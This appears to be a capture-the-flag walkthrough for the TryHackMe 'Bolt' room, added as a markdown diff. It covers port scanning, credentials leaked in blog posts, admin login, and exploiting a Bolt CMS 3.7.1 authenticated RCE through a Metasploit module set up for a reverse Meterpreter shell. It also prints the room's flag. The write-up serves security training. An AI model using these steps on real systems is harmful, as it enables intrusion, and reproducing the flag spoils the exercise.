@@ -1,0 +1,194 @@
+
+# 🔐 TryHackMe: Bolt – Professional Walkthrough
+
+## 📌 Objective
+
+The goal of this room is to exploit a vulnerable Bolt CMS instance by:
+
+1. Identifying exposed credentials.
+2. Gaining access to the admin panel.
+3. Exploiting a known Remote Code Execution (RCE) vulnerability.
+4. Getting a reverse shell.
+5. Capturing the final flag.
+
+This room is perfect for beginners who are learning **web exploitation**, **CMS-based vulnerabilities**, and **remote code execution**.
+
+
+
+## 🕵️ Step 1: Reconnaissance
+
+### 🔌 Connecting to the Network
+
+First, make sure you're connected to TryHackMe's VPN or using the AttackBox.
+
+Check connectivity to the target:
+
+
+ping <TARGET_IP>
+
+
+You should see responses if the target is live.
+
+
+### 🔍 Nmap Scan – Discover Open Ports and Services
+
+Use Nmap to find which ports and services are running on the target:
+
+nmap -sC -sV -p- -oN nmap_full.txt <TARGET_IP>
+
+
+**Flags used:**
+
+* `-sC`: Runs default scripts
+* `-sV`: Detects version info
+* `-p-`: Scans all 65535 ports
+* `-oN`: Outputs the result in a file
+
+**Results:**
+
+
+PORT     STATE SERVICE VERSION
+8000/tcp open  http    Bolt CMS (Apache)
+
+
+> ⚠️ The Bolt CMS is hosted on **port 8000**, not the usual port 80. This is important.
+
+
+
+## 🌐 Step 2: Web Enumeration
+
+### 🔎 Browsing the Web Interface
+
+Go to the web interface in your browser:
+
+http://<TARGET_IP>:8000
+
+
+You’ll see a **Bolt CMS-powered blog page**.
+
+There are some blog posts — let’s look closely.
+
+
+### 🔐 Extracting Credentials from Blog Posts
+
+Carefully reading the **first and second blog posts** reveals the login credentials.
+
+* **Username** is mentioned casually in one of the posts.
+* **Password** is written in plain text in another post.
+
+This is a **real-world mistake** developers make — leaking credentials in public-facing content.
+
+✅ **Save these credentials** — you’ll need them to log in.
+
+
+
+## 🔑 Step 3: Logging into the Bolt Admin Panel
+
+Bolt CMS admin panel is usually located at:
+
+
+http://<TARGET_IP>:8000/bolt
+
+
+Enter the credentials you found from the blog.
+
+If login is successful, you're now inside the CMS.
+
+
+
+## 🧪 Step 4: Identify the CMS Version
+
+Once inside the dashboard, scroll to the bottom.
+
+You’ll see something like:
+
+
+Bolt v3.7.1
+
+
+Why is this important?
+
+> Knowing the **exact CMS version** allows us to search for **known vulnerabilities** in public exploit databases.
+
+
+
+## 🔍 Step 5: Vulnerability Research
+
+### 🔍 Search on Exploit-DB
+
+Use `searchsploit` or Google:
+
+
+searchsploit bolt cms 3.7.1
+
+
+Or manually search:
+
+> "Bolt CMS 3.7.1 authenticated RCE site\:exploit-db.com"
+
+**Result:**
+
+> ✅ **Exploit Title:** Bolt CMS 3.7.1 - Authenticated Remote Code Execution
+> **Exploit-DB ID:** 48296
+
+This exploit works **after you log in**, which we’ve already done.
+
+
+## 💥 Step 6: Exploitation via Metasploit
+
+We’ll now use **Metasploit** to automate the exploit.
+
+### 🧰 Start Metasploit
+
+
+msfconsole
+
+
+### 🔍 Search and Use the Exploit
+
+
+search bolt
+use exploit/unix/webapp/bolt_authenticated_rce
+
+
+### ⚙️ Configure the Exploit
+
+set RHOSTS <TARGET_IP>
+set RPORT 8000
+set TARGETURI /
+set USERNAME <the_username>
+set PASSWORD <the_password>
+set LHOST <your_ip>
+set LPORT 4444
+set PAYLOAD php/meterpreter/reverse_tcp
+
+
+Then run:
+
+run
+
+
+🎯 If successful, you’ll get a **reverse shell** back — typically a **Meterpreter shell**.
+
+
+## 🛠️ Step 7: Post-Exploitation
+
+Inside the shell, check your current user:
+
+whoami
+
+
+Unlike some other rooms, **this box doesn’t require traditional privilege escalation**. The user you land as already has access to the flag.
+
+### 🏁 Capture the Flag
+
+cat /home/flag.txt
+
+✅ **Flag:**
+
+THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
+
+
+
+
+
